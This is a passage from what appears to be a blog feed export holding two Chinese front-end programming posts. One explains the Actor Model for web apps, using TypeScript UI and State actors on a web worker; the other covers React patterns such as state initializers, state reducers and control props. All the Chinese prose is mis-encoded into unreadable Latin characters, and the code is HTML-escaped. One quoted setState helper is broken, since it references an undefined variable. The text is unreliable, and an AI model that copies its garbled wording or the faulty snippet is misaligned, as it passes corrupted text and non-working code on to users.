ä¸€å€‹ Actor å°æ–¼ä»–å‰µå»ºçš„ Actor å¯ä»¥æ“æœ‰ supervisor çš„æ¬Šé™ï¼Œå¯ä»¥å‘Šè¨´å…¶ç®¡æ§çš„ Actor èªªï¼šã€å¦‚æœä½  crash äº†ï¼Œè‡³å°‘æ­»å‰ä¸Ÿçµ¦æˆ‘å€‹è¨Šæ¯è·Ÿæˆ‘èªªã€ï¼Œç„¶å¾Œç•¶ Supervisor Actor æ”¶åˆ° Actor æ­»äº¡è¨Šæ¯æ™‚ï¼Œå¯ä»¥å†å‚³é€ â€œrestartâ€ Message å»é‡å•Ÿ Actorï¼Œé€™æ¨£çš„èƒ½åŠ›é€ å°±äº†ä¸€å€‹ Self-healing systemsï¼š

çœ‹åˆ°é€™é‚Šæœƒç™¼ç¾ï¼Œé›–ç„¶ Actor model æ˜¯å› ç‚º concurrent computation è€Œæå‡ºçš„ï¼Œä½†å…¶ç‰¹æ€§ç”¨åœ¨åˆ†æ•£å¼ç³»çµ±ä¸Šä¹Ÿæ˜¯éå¸¸åˆé©çš„ï¼Œæ¯å€‹ Actor è·‘åœ¨ä¸åŒçš„ thread ä¸Šï¼Œç•¶ç„¶ä¹Ÿå¯ä»¥æ˜¯ä¸åŒçš„é ç«¯ç’°å¢ƒä¸Šï¼Œä¸¦é€éçµ±ä¸€å€‹ Message ä»‹é¢æºé€šã€‚
é‹ç”¨åˆ° Web å‰ç«¯ä¸Šåœ¨ç€è¦½å™¨çš„ä¸–ç•Œä¸­ï¼Œä¹Ÿæ˜¯å­˜åœ¨æœ‰å¤šç¨® Process èˆ‡ Contextï¼ˆæ¨è–¦é–±è®€ @Mariko çš„é€™ç¯‡ç€è¦½å™¨æ·±å…¥æ·ºå‡ºä»‹ç´¹)ï¼Œåƒæ˜¯è² è²¬æ¸²æŸ“çš„ UI Processï¼Œè€Œåœ¨ DOM å¤–çš„ web worker å‰‡æ˜¯å¦ä¸€å€‹ç¨ç«‹çš„ Worker Processï¼Œå°±æƒ³æ˜¯ä¸€å€‹ç¸®å°ç‰ˆçš„åˆ†æ•£å¼ç³»çµ±ï¼ŒWorker Process æ²’è¾¦æ³•ç›´æ¥å­˜å– UI Process æ‰€æ§åˆ¶çš„ DOM å…ƒä»¶ï¼Œç›¸å°çš„ UI Process ä¹Ÿç„¡æ³•ç›´æ¥å‘¼å« Worker Process ä¸­æ‰€å­˜åœ¨çš„å‡½å¼ã€‚
ç…§è‘—é€™æ¨£çš„é‚è¼¯æ¢³ç†ä¸‹ä¾†ï¼ŒWeb å‰ç«¯çœŸçš„æ˜¯è »é©åˆå¥—ç”¨ Actor Model çš„ï¼Œå°±åƒæˆ‘å€‘æœ‰å€‹ UI Actor é‹è¡Œåœ¨ UI Processï¼ŒåŒæ™‚è² è²¬æ§åˆ¶ç‹€æ…‹çš„ State Actor é‹è¡Œåœ¨ Worker Processï¼Œå½¼æ­¤ä¹‹é–“é€é Message ä¾†æºé€šã€‚
é€é Actor Model ä¾†åˆ‡å‰² UI èˆ‡ State çš„é—œä¿‚ï¼Œåªè¦è™•ç†å¾—ç•¶ï¼Œç†è«–ä¸Šæˆ‘å€‘èƒ½å¤ è®“ä¸€å¥—ç›¸åŒå•†æ¥­é‚è¼¯çš„ Web appï¼Œè¼•æ˜“åœ°å¾æ™®é€šçš„ Web è½‰æ›æˆ 3D ç‰ˆæœ¬ï¼Œæˆ–æ˜¯ Web VR ç‰ˆæœ¬ã€‚
æ›´æ£’çš„æ˜¯ï¼Œå°‡é—œæ³¨é»åˆ†é›¢æˆå„ç¨® Actor å¾Œï¼Œcode splitting è®Šå¾—æ›´è‡ªç„¶æ›´å®¹æ˜“äº†ï¼Œæ¯å€‹ Actor éƒ½èƒ½å¤ åœ¨éœ€è¦çš„æ™‚å€™å†è¼‰å…¥å³å¯ã€‚
Web æ‡‰ç”¨çš„ç¯„ä¾‹èªªäº†é€™éº¼å¤šï¼Œä¾†çœ‹é»å¯¦éš›çš„ä¾‹å­ï¼
æ—¢ç„¶é€™å€‹æ¦‚å¿µæ˜¯ Google engineer åœ¨ä»–å€‘çš„é–‹ç™¼å¤§æœƒå±•ç¤ºçš„ï¼Œå‹¢å¿…æœ‰ Demo code å¯ä»¥çœ‹ï¼Œé€™å¥—å«åš actor-boilerplate çš„ repository åŒ…å«äº† actor-helper ä¾†å¹«å¿™ cover äº† Actor Model èˆ‡ Messaging system çš„å¯¦ä½œç´°ç¯€ï¼Œè®“æˆ‘å€‘èƒ½è¼•æ˜“çš„é«”é©— Actor Model é‹ç”¨åœ¨ Web Frontend çš„æ„Ÿè¦ºã€‚
æˆ‘å€‘åšå€‹ç°¡å–®çš„åŸºç¤ä»£è¬ç‡(BMR)è¨ˆç®—å™¨ä¾†æ„Ÿå—ä¸€ä¸‹ã€‚
å…ˆçœ‹ä¸€ä¸‹æˆæœï¼š

UI ä¸Šå°±æ˜¯ç°¡å–®å¹¾å€‹ input æ¬„ä½è€Œå·²ï¼ŒæŒ‰ä¸‹æŒ‰éˆ•å¾Œï¼Œå–å‡ºä½¿ç”¨è€…è¼¸å…¥çš„å€¼é€²è¡Œè¨ˆç®—ï¼Œæœ€å¾Œé¡¯ç¤ºçµæœã€‚é€™æ®µæµç¨‹æˆ‘å€‘å¯ä»¥æ‹†åˆ†æˆå…©å€‹ Actor ä¾†å®Œæˆï¼Œåˆ†åˆ¥æ˜¯æ§åˆ¶ UI çš„ UI Actor èˆ‡æ›´å‹• State çš„ State Actorã€‚ï¼ˆä»”ç´°çœ‹ä¸Šæ–¹çš„ gif çš„è©±ï¼Œå¯ä»¥çœ‹åˆ° State Actor å…¶å¯¦æ˜¯é‹è¡Œåœ¨ Worker process ä¸Šçš„ã€‚
æ¥è‘—æˆ‘å€‘å…ˆä¾†çœ‹çœ‹ UI Actor é•·ä»€éº¼æ¨£å­ï¼Œé—œéµçš„ç¨‹å¼ç¢¼åœ¨ä¸‹é¢é€™å¹¾è¡Œï¼ˆé †å¸¶ä¸€æï¼Œå› ç‚º action-boilerplate æœ¬èº«å°±æ˜¯ä»¥ TypeScript å¯¦ä½œï¼Œå› æ­¤æ¥ä¸‹ä¾†ç¯„ä¾‹ä¹Ÿæ˜¯ TypeScriptï¼‰ï¼š
import &#123; Actor, lookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;export default class UiActor extends Actor&lt;Message&gt; &#123;  private state = lookup(&quot;state&quot;);  private resultEl = document.getElementById(&quot;result&quot;) as HTMLSpanElement;  private getInputVal = () =&gt; &#123;    // gender    const genderEl = document.getElementById(&quot;gender&quot;) as HTMLSelectElement;    const genderVal = genderEl.value;    // height, weight, age ä¾æ­¤é¡æ¨...    return &#123;      gender: genderVal,      height: heightVal,      weight: weightVal,      age: ageVal,    &#125;  &#125;;  async init() &#123;    const calculateButton = document.getElementById(      &quot;Calculate&quot;    ) as HTMLButtonElement;    calculateButton.onclick = () =&gt;      this.state.send(&#123;        type: StateMessageType.CALCULATE,        value: this.getInputVal()      &#125;);      //...ç•¥  &#125;  async onMessage(msg: Message) &#123;    this.resultEl.textContent = `$&#123;msg.state.result&#125;`;  &#125;&#125;

é¦–å…ˆå¾ actor-helpers ä¸­å–å‡º Actor ç‰©ä»¶ä¾†ç¹¼æ‰¿ï¼Œå¯¦ä½œå…©å€‹ä¸»è¦å‡½å¼ï¼šinit() èˆ‡ onMessage()ï¼š

init()ï¼šè² è²¬åœ¨åˆå§‹æ™‚èˆ‡ DOM å…ƒä»¶å»ºç«‹é—œä¿‚ï¼Œç¶å®š event handlerï¼Œç•¶äº‹ä»¶è§¸ç™¼æ™‚å‚³éè¨Šæ¯çµ¦ State Actorã€‚
onMessage():å°±åƒæ˜¯æ¥æ”¶ postMessage å‚³é€çš„è¨Šæ¯ä¸€èˆ¬ï¼Œactor-helpers å¹«æˆ‘å€‘ä¸²æ¥å¥½è¨Šæ¯æºé€šé€™æ®µï¼Œåœ¨é€™ onMessage() ä¸­ï¼Œå¯ä»¥æ¥æ”¶åˆ°å…¶ä»– Actor å‚³é€éä¾†çš„è¨Šæ¯ã€‚

åœ¨ init() ä¸­çš„ this.state æ˜¯ä»€éº¼å‘¢ï¼Ÿç‚ºä»€éº¼ä»–å¯ä»¥ send messageï¼Ÿ
é‚£æ˜¯æˆ‘å€‘åˆ©ç”¨ actor-helpers æä¾›çš„ lookup å‡½å¼ï¼Œå°‡ State Actor ç¶å®šåˆ°å‰µå»ºçš„ç§æœ‰è®Šæ•¸ä¸Šï¼Œé€™æ¨£å°±èƒ½ä½¿ç”¨ send ä¾†å‚³é€è¨Šæ¯ã€‚
æ¥è‘—æˆ‘å€‘ä¾†çœ‹çœ‹ State Actorï¼š
import &#123; Actor, lookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;// lots of Type definitions...// ...ç•¥export default class StateActor extends Actor&lt;Message&gt; &#123;  private ui = lookup(&quot;ui&quot;);  private state: State = &#123;    result: 0  &#125;;  async onMessage(msg: Message) &#123;    switch (msg.type) &#123;      case MessageType.CALCULATE:        const &#123;          weight,          height,          age,          gender        &#125;: BMRParams = msg.value;        // Do the math        this.state.result = bmr;        break;      case MessageType.RESET:        this.state.result = 0;        break;    &#125;    this.ui.send(&#123;      state: this.state    &#125;);  &#125;&#125;

è·Ÿ UI Actor å¤§åŒå°ç•°ï¼Œç¹¼æ‰¿ Actor ä¸¦åˆ©ç”¨ lookup ç¶å®š UI Actor åˆ°ç§æœ‰è®Šæ•¸ä¸Šï¼Œåœ¨ onMessage() ä¸­ï¼Œæ ¹æ“šæ¥æ”¶åˆ°çš„ Message Type ä¾†åŸ·è¡Œå°æ‡‰å‹•ä½œï¼Œä¸¦æ›´æ”¹è‡ªèº«çš„ stateï¼Œå†å°‡ Result Message å‚³å›çµ¦ UI Actorã€‚
é€é action-helpsï¼Œå¯¦ä½œ Actor è®Šå¾—æ–¹ä¾¿è¨±å¤šï¼ˆç•¶ç„¶ä¹Ÿæ˜¯å› ç‚ºé€™æ˜¯å¾ˆç°¡å–®çš„ä¾‹å­â€¦ï¼‰ã€‚
ä¸éé‚„æ²’çµæŸï¼ŒActor éƒ½æœ‰äº†ä»¥å¾Œï¼Œæˆ‘å€‘è¦æ€éº¼ä½¿ç”¨å‘¢ï¼Ÿ
æˆ‘å€‘è¦æº–å‚™å…©å€‹ç‰¹æ®Šçš„æª”æ¡ˆï¼Œbootstrap.ts èˆ‡ worker.tsï¼š
import &#123; hookup, initializeQueues &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;import UiActor from &quot;./actors/ui.js&quot;;async function bootstrap() &#123;  await initializeQueues();  hookup(&quot;ui&quot;, new UiActor());  const worker = new Worker(&quot;worker.js&quot;);  // This is necessary in Safari to keep the worker alive.  // ç›¸é—œè¨è«–å¯ä»¥çœ‹ repo å…§çš„ issue https://github.com/PolymerLabs/actor-boilerplate/issues/13  setInterval(() =&gt; &#123;    worker.postMessage(&quot;&quot;);  &#125;, 3000);&#125;bootstrap();

é¡§åæ€ç¾©ï¼Œbootstrap.ts è² è²¬å•Ÿå‹•æ•´å€‹å°ˆæ¡ˆï¼Œé€é hookup è¼‰å…¥ UI Actorï¼Œä¸¦ä¸” new å‡ºä¸€å€‹ worker ä¾†é‹è¡Œæˆ‘å€‘çš„ State Actorã€‚
initializeQueues ä¸»è¦æ˜¯åœ¨ç¨‹å¼åŸ·è¡Œå‰ï¼Œæ¸…ç©ºç›®å‰ç€è¦½å™¨çš„ Message queueï¼Œè©²å‡½å¼çš„ç¨‹å¼ç¢¼ä¹Ÿå°±ä¸€è¡Œ await messageStore.popMessages(&quot;*&quot;);ã€‚
è€Œ worker.ts çš„å…§å®¹æ›´ç°¡å–®ï¼š
import &#123; hookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;import StateActor from &quot;./actors/state.js&quot;;hookup(&quot;state&quot;, new StateActor());

å°±æ˜¯ hookup State Actorï¼
æœ€å¾Œåœ¨ä½ çš„ html ä¸ŠåŠ å…¥ bootstrap.ts å³å¯ï¼Œé€™æ¨£æˆ‘å€‘å°±å®Œæˆäº†ä¸€å€‹ä»¥ Actor Model ç‚ºåŸºç¤æ¶æ§‹çš„ Web appï¼
å®Œæ•´ç¨‹å¼ç‘ªå¯å¾æ­¤åƒè€ƒã€‚
çµè«–Actor Model é›–ç„¶æœ‰äº† actor-helps çš„å¹«å¿™ï¼Œå¯¦ä½œä¸Šä¾†èªªå·²ç¶“ç°¡æ˜“å¾ˆå¤šï¼Œä½†ä»»ä½•æ“ä½œéƒ½è¦é€é Message çš„å¯¦ä½œæ–¹å¼åœ¨å‰ç«¯æ‡‰ç”¨ä¸Šææ€•é‚„æ˜¯ä¸å¥½è¢«æ¥å—ï¼Œå¯èƒ½ä¹Ÿå› ç‚ºå¦‚æ­¤ï¼Œactor-boilerplate å…¶å¯¦åœ¨å»å¹´ Chrome dev summit çµæŸå¾Œä¼¼ä¹å°±æ²’å†æ›´æ–°äº† XD
ä¸éæˆ‘å€‹äººæ˜¯è »å–œæ­¡é€™å€‹æƒ³æ³•çš„ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒå†ä¾†çœŸçš„å¯¦ä½œä¸€å€‹ä¸åŒ View ä½†ä½¿ç”¨åŒæ¨£ State çš„ Web app çœ‹çœ‹ï¼
å¦å¤–ï¼Œæˆ‘ä¹Ÿç™¼ç¾åˆ°ï¼ŒWeb worker é›–å­˜åœ¨å·²ä¹…ï¼Œä½†æ˜¯ä½¿ç”¨ä¸Šçš„é™åˆ¶ï¼Œè®“ä¸€èˆ¬æˆ‘å€‘åœ¨é–‹ç™¼ä¸Šå¾ˆå°‘æœƒå»è€ƒæ…®ä»–ï¼Œä½†é€™å¹¾å¹´çœ‹ä¾†ï¼Œåƒæ˜¯ AMP ç­‰ç­‰çš„å‡ºç¾ï¼Œç™¼ç¾ Google ä¼¼ä¹åœ¨æ¨å»£ä¸€å€‹æ¦‚å¿µï¼Œå°±æ˜¯ User experience firstï¼ŒDeveloper experience secondï¼ŒDeveloper æ“…é•·è™•ç†è¤‡é›œçš„äº‹æƒ…ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘å€‘æ‡‰è©²å°ˆæ³¨åœ¨æä¾›ä½¿ç”¨è€…æœ€ä½³ä½¿ç”¨é«”é©—ä¸Šï¼Œè€ŒçŠ§ç‰²ä¸€é»é–‹ç™¼é«”é©—ã€‚
å¦‚æœä½ çš„ Web app æœ‰è¤‡é›œé‹ç®—çš„éœ€æ±‚ï¼Œå°±è©¦è©¦çœ‹ç”¨ Actor Model ä¾†å°‡è¤‡é›œçš„é‚è¼¯ä¸Ÿçµ¦åœ¨ Worker process çš„ Actor è™•ç†å§ï¼
è³‡æ–™ä¾†æº
Lights, Camera, Action!
actor-boilerplate
[COSCUP 2011] Programming for the Future, Introduction to the Actor Model and Akka Framework
wiki - Actor Model
Inside Browser

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>web worker</tag>
        <tag>google chrome</tag>
        <tag>architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>é€²éš React Component Patterns ç­†è¨˜ï¼ˆä¸‹ï¼‰</title>
    <url>/2018/07/21/advanced-react-component-patterns-note-II/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡æˆ‘å€‘ä»‹ç´¹äº†ä¸‰ç¨® Rect Component Patternsï¼ŒåŒ…å« Compound componentã€Render props component èˆ‡ Prop collections &amp; gettersï¼Œè€Œä»Šå¤©è¦ç¹¼çºŒå¾€ä¸‹ä»‹ç´¹å‰©ä¸‹çš„äº”å€‹ Patterns:

State Initializers
State Reducer
Control Props
Provider
Higher-order component

è‹¥å°å‰ä¸‰å€‹ Pattern ä¸ç†Ÿæ‚‰ï¼Œæˆ–æ˜¯æ²’çœ‹éä¸Šä¸€ç¯‡æ–‡ç« çš„å¯ä»¥ç§»é§•è‡³ é€²éš React Component Patterns ç­†è¨˜ï¼ˆä¸Šï¼‰
æ¥ä¸‹ä¾†çš„ Pattern éƒ½æœƒå»¶çºŒä¹‹å‰çš„ Demo ç¯„ä¾‹ï¼Œæ‰€ä»¥å»ºè­°å…ˆé–±è®€éä¸Šç¯‡ï¼
æ­¤å¤–ï¼Œæ¯å€‹ Pattern çš„æœ€å¾Œéƒ½æ”¾æœ‰ codesandbox çš„ demo linkï¼Œè¦ºå¾—æ–‡å­—å¤ªå¤šçš„å¯ä»¥ç›´æ¥å»çœ‹å®Œæ•´çš„ code å–”ï¼
State Initializersæœ‰æ™‚å€™æˆ‘å€‘æœƒå¸Œæœ›èƒ½è®“å…ƒä»¶å›å¾©åˆ°åˆå§‹ç‹€æ…‹ï¼Œæˆ–æ˜¯èƒ½è®“ä½¿ç”¨è€…è‡ªå·±å®šç¾©åˆå§‹ç‹€æ…‹ï¼Œé€™æ™‚å°±é©åˆæ¡ç”¨ State initializer æŠ€å·§ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘åˆ©ç”¨è‡ªå®šç¾©çš„ initialState ä¾†å­˜æ”¾å…ƒä»¶åˆå§‹ç‹€æ…‹ï¼Œè€Œåœ¨çœŸæ­£çš„ state ä¸­å» reference å®ƒï¼š
class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;;  initialState = &#123; on: false &#125;;  state = this.initialState;  // ...other function&#125;

é€™æ¨£ä¸€ä¾†ï¼Œè¦å¯¦ä½œ reset å‡½å¼å°±ç›¸ç•¶ç°¡å–®äº†ï¼š
reset = () =&gt;  this.setState(this.initialState, () =&gt;    this.props.onReset(this.initialState)  );

è€Œè¦è®“ä½¿ç”¨è€…èƒ½è‡ªå®šç¾©å…ƒä»¶åˆå§‹ç‹€æ…‹çš„æ–¹å¼ï¼Œç›¸ä¿¡å¤šæ•¸è®€è€…éƒ½æœ‰ç”¨éï¼Œä¹Ÿå°±æ˜¯è®“ä½¿ç”¨è€…é€é props ä¾†å®šç¾©å…ƒä»¶çš„ initial stateï¼š
class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125;, initialOn: false &#125;;  initialState = &#123; on: this.props.initialOn &#125;;  state = this.initialState;  // ...other function&#125;

ç”±æ–¼ä¸¦ä¸æ˜¯æ‰€æœ‰ä½¿ç”¨è€…éƒ½æœƒè‡ªè¡Œå®šç¾©åˆå§‹ç‹€æ…‹ï¼Œæ‰€ä»¥åˆ¥å¿˜äº†åœ¨ defaultProps ä¸­å®£å‘Šæˆ‘å€‘è‡ªå·±å¸Œæœ›çš„åˆå§‹å€¼å–”ï¼
Demo link
ä¸Šé¢çš„ Demo ç¯„ä¾‹æ˜¯å»¶çºŒä¸Šç¯‡æåˆ°çš„ Prop collections &amp; getters èˆ‡ Render propsï¼Œæ‰€ä»¥é€™é‚ŠåŠ å…¥çš„ reset æŒ‰éˆ•è¦è¨˜å¾—åŠ å…¥ getStateAndHelpers ä¸­å‚³éçµ¦ render props ä¸­çš„ children ä½¿ç”¨ã€‚
State ReducerState Reducer æ˜¯ä¸€å€‹è »æœ‰è¶£çš„æ¦‚å¿µï¼Œä¸»è¦ç›®çš„æ˜¯è®“ä½¿ç”¨è€…èƒ½å¤ ä»‹å…¥å…ƒä»¶ç‹€æ…‹æ”¹è®Šçš„è¡Œç‚ºï¼Œè®“å…ƒä»¶åœ¨æ¯æ¬¡çš„ setState æ™‚ï¼Œéƒ½èƒ½å¤ è¢«ä½¿ç”¨è€…å½±éŸ¿ã€‚
èˆ‰å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œåƒæ˜¯æˆ‘å€‘å…ˆå‰çš„ Toggle componentï¼Œå¦‚æœä»Šå¤©ä½¿ç”¨è€…æå‡ºå€‹éœ€æ±‚ï¼Œæƒ³è¦è®“é€™å€‹å…ƒä»¶åªèƒ½è¢« toggle ä¸‰æ¬¡ï¼Œé‚£æˆ‘å€‘è©²æ€éº¼åšå‘¢ï¼Ÿ
ä½ ç•¶ç„¶å¯ä»¥è®“ä½¿ç”¨è€…å¤šå‚³ä¸€å€‹ props æ§åˆ¶æ¬¡æ•¸ï¼Œç„¶å¾Œåœ¨å…§éƒ¨æ›´å‹•ç‹€æ…‹æ™‚å»æª¢æŸ¥æœ‰æ²’æœ‰è¶…éé‚£å€‹æ¬¡æ•¸ï¼š
class Toggle extends React.Component &#123;  static defaultProps = &#123;    onToggle: () =&gt; &#123;&#125;,    onReset: () =&gt; &#123;&#125;,    initialOn: false  &#125;;  // å…ƒä»¶å…§éƒ¨å¤šä¸€å€‹ toggleTimes ä¾†æ§åˆ¶ç›®å‰çš„ toggle æ¬¡æ•¸  initialState = &#123; on: this.props.initialOn, currentToggleTimes: 0 &#125;;  state = this.initialState;  reset = () =&gt;    this.setState(this.initialState, () =&gt;      this.props.onReset(this.initialState)    );  toggle = () =&gt; &#123;    // æ¯æ¬¡ toggle æ™‚åˆ¤æ–·æœ‰æ²’æœ‰è¶…éä½¿ç”¨è€…å®šç¾©çš„ toggle æ¬¡æ•¸ä¸Šé™    if (this.state.currentToggleTimes &gt;= this.props.toggleTimes) &#123;      console.log(&#x27;toggle too much&#x27;)      return;    &#125;    this.setState(      (&#123; on &#125;) =&gt; (&#123;        on: !on,        currentToggleTimes:this.state.currentToggleTimes + 1 &#125;),      () =&gt; this.props.onToggle(this.state.on),    );  &#125;  // ...other methods&#125;

ä½†ä½ ä¹ŸçŸ¥é“ä½¿ç”¨è€…çš„éœ€æ±‚ç¸½æ˜¯æœƒè®Šå‹•ï¼Œå‡å¦‚ä»–çªç„¶é–“ä¹Ÿæƒ³æ§åˆ¶ reset çš„æ¬¡æ•¸æ€éº¼è¾¦? ä½ çš„ç¨‹å¼ä¸å°±æ”¹ä¸å®Œï¼Ÿ
é€™æ™‚æˆ‘å€‘å°±èƒ½æ¡ç”¨ State Reducerï¼Œå…ˆçœ‹ä¸€ä¸‹ä½¿ç”¨è€…æ‡‰è©²æœƒæ€éº¼ä½¿ç”¨ State Reducerï¼šï½€
class App extends React.Component &#123;  initialState = &#123; timesClicked: 0 &#125;  state = this.initialState  toggleStateReducer = (state, changes) =&gt; &#123;    // state ç‚º Toggle çš„ current state    // changes ç‚ºè©²æ¬¡ Toggle å‹•ä½œæ‰€é€ æˆçš„æ”¹è®Š    if (this.state.timesClicked &gt;= 4) &#123;      return &#123; ...changes, on: false &#125;    &#125;    return changes  &#125;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle          initialOn=&#123;true&#125;          onToggle=&#123;on =&gt; &#123;            this.setState((&#123; timesClicked &#125;) =&gt; (&#123;               timesClicked: timesClicked + 1,             &#125;))          &#125;&#125;          onReset=&#123;initialState =&gt; this.setState(this.initialState)&#125;          stateReducer=&#123;this.toggleStateReducer&#125;        &gt;          &#123;(&#123; on, getTogglerProps, reset &#125;) =&gt; (            // render props          )&#125;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

æˆ‘å€‘è®“ä½¿ç”¨è€…å‚³å…¥ä¸€å€‹ stateReducerï¼Œå…¶ä¸­æ¥å—å…©å€‹åƒæ•¸ï¼Œä¸€å€‹æ˜¯ Toggle component çš„ current stateï¼Œå¦ä¸€å€‹æ˜¯è©²æ¬¡ Toggle component åŸ·è¡Œ setState æ™‚ï¼Œæ‰€æ¥å—çš„è®ŠåŒ– changesï¼Œè€Œå›å‚³å€¼å°±æ˜¯ Toggle component å¯¦éš› setState æ™‚æ‰€æ¥å—çš„ change objectã€‚
å› æ­¤åœ¨é€™å€‹å‡½å¼ä¸­ï¼Œä½¿ç”¨è€…å°±æ“æœ‰äº†ä¸€å€‹æ©Ÿæœƒèƒ½å¤ åœ¨å…ƒä»¶çœŸæ­£è§¸ç™¼ setState ä¹‹å‰ï¼Œé€²è¡Œä¸€äº›æ“ä½œï¼Œä»¥å‰›å‰›ä¾‹å­ä¾†èªªï¼Œå°±èƒ½åœ¨é€™é‚Šåˆ¤æ–·ä½¿ç”¨è€…è‡ªå·±ç´€éŒ„çš„ state(timesClicked) æœ‰æ²’æœ‰è¶…éæŸå€‹å€¼ï¼Œå¦‚æœè¶…éäº†ï¼Œé‚£æˆ‘å€‘ä¹‹å¾Œæ¯æ¬¡çš„å›å‚³çµæœä¸­ï¼Œéƒ½æœƒå°‡ on é€™å€‹ state è¨­ç‚º falseã€‚
é‚£å…ƒä»¶æœ¬èº«è©²å¦‚ä½•è®“ stateReducer ä»‹å…¥ setState ä¸­å‘¢ï¼Ÿé‡é»å°±åœ¨é€™æ®µï¼š
internalSetState(changes, callback) &#123;    this.setState(currentState =&gt; &#123;      // ç¢ºèªå‚³å…¥çš„ changes æ˜¯å–®ç´”çš„ç‰©ä»¶ï¼Œæˆ–æ˜¯å‡½å¼      const changesObject =        typeof changes === &#x27;function&#x27; ? changes(currentState) : changes      // å‘¼å«ä½¿ç”¨è€…å‚³å…¥çš„ stateReducer ä¾†å–å¾—æœ€çµ‚çš„ state change object      const reducedChanges =        this.props.stateReducer(currentState, changesObject) || &#123;&#125;      // æœ€å¾Œåªæ˜¯æª¢æŸ¥ä¸€ä¸‹ changes æ˜¯å¦ç‚ºç©ºï¼Œé¿å…é‡è¤‡ render      return Object.keys(reducedChanges).length        ? reducedChanges        : null    &#125;, callback)  &#125;

æˆ‘å€‘éœ€è¦å»ºç«‹ä¸€å€‹ä»‹é¢èˆ‡åŸæœ¬ setState ç›¸åŒçš„ internalSetState çš„æ–¹æ³•ï¼Œå–ä»£åŸæœ¬çš„ setStateã€‚
å…¶ä¸­éœ€è¦æ³¨æ„çš„æœ‰å…©é»ï¼Œä¸€å€‹æ˜¯åŸæœ¬çš„ setState æ˜¯èƒ½æ¥å—å‡½å¼ç•¶ç¬¬ä¸€å€‹åƒæ•¸çš„ï¼Œå› æ­¤æˆ‘å€‘éœ€è¦å…ˆåˆ¤æ–· changes æ˜¯å¦ç‚º functionï¼Œæ‰èƒ½ç¹¼çºŒé€²è¡Œå…¶ä»–å‹•ä½œã€‚
å¦ä¸€å€‹å‰‡æ˜¯ä¸¦éæ‰€æœ‰çš„ setState éƒ½ä¸€å®šè¦ç”¨ internalSetState å–ä»£ï¼Œåƒæ˜¯ reset function æˆ‘å€‘å¯èƒ½ä¸å¤ªå¸Œæœ›ä½¿ç”¨è€…èƒ½ä»‹å…¥ï¼Œæ‡‰è©²è¦å¾ˆæ˜ç¢ºçš„ reset æ‰€æœ‰ç‹€æ…‹ï¼Œå› æ­¤é€™é‚Šå¯ä»¥ç”¨åŸæœ¬çš„ setStateã€‚
çœ‹çœ‹ Demo Link ï¼Œä¸¦å¯¦éš›ç©ç©çœ‹æœƒæ›´æ¸…æ¥šï¼
å¦å¤–ï¼Œåœ¨ Kent C. Dodds çš„ workshop ä¸­ï¼Œä»–åœ¨ internalSetState çš„å¯¦ä½œä¸Šæœ‰æåˆ°ä¸€ç¨®ä»–æ¯”è¼ƒåå¥½çš„å¯«æ³•ï¼š
internalSetState(changes, callback) &#123;    this.setState(currentState =&gt; &#123;      return [changes]        .map(c =&gt; typeof c === &#x27;function&#x27; ? changes(currentState) : c)        .map(c =&gt; this.props.stateReducer(currentState, c) || &#123;&#125;)        .map(c =&gt; Object.keys(reducedChanges).length ? c : null)[0]  &#125;

é€éç¡¬è½‰æˆ array å¾Œï¼Œå†ç”¨ map å°‡æ¯å€‹æ­¥é©Ÿ chain èµ·ä¾†ï¼Œçš„ç¢ºæ¯”è¼ƒä¹¾æ·¨è·Ÿç°¡å–®ï¼Œä½†æ¯”èµ·åŸæœ¬åšæ³•æ²’é‚£éº¼ç›´è¦ºå°±æ˜¯äº†ï¼Œå°¤å…¶æ˜¯æœ€å¾Œé‚„è¦å– [0] å‡ºä¾†ï¼Œä½†åƒè€ƒä¸€ä¸‹ä¹Ÿä¸éŒ¯ï¼
é€é State Reducerï¼Œä¸åƒ…ä½¿ç”¨è€…é–‹å¿ƒï¼ˆèƒ½å¤ ä»‹å…¥å…ƒä»¶ state çš„æ›´å‹•ï¼‰ï¼Œé–‹ç™¼è€…ä¹Ÿä¸ç”¨ç–²æ–¼å¥”å‘½ä¸€ç›´æ”¹ codeï¼ˆè®“ä½¿ç”¨è€…è‡ªå·±è™•ç† reducer å¯¦éš›å…§å®¹ï¼‰ï¼Œä½†å£è™•å°±æ˜¯ä½ éœ€è¦å‘¼å«ä¸€å€‹ internalSetState çš„å‡½å¼ï¼Œè »å¯èƒ½é€ æˆ trace code ä¸Šçš„å›°æ“¾ï¼Œç®—æ˜¯å€‹ trade-offã€‚
Control Propsé™¤éä½ å¾ä¾†æ²’æœ‰ç”¨ React é–‹ç™¼èˆ‡è¡¨å–®ç›¸é—œçš„ componentï¼Œå¦å‰‡ä½ ä¸€å®šç”¨é Control Propsï¼Œå› ç‚ºæ‰€è¬‚çš„ Control Props å…¶å¯¦å°±æ˜¯ Controlled component çš„ä¸€ç¨®å¯¦ä½œã€‚
èˆ‰ä¾‹ä¾†èªªï¼ŒSelect, Input ç­‰ Form çš„å…ƒä»¶ï¼Œç•¶ä½¿ç”¨è€…è¼¸å…¥å€¼æ™‚ï¼Œå…¶æ”¹è®Šçš„æ˜¯å…ƒä»¶çš„å…§éƒ¨ç‹€æ…‹ï¼Œè©²ç‹€æ…‹é€šå¸¸ç¶å®šåœ¨ value é€™å€‹å±¬æ€§ä¸Šé ­ã€‚
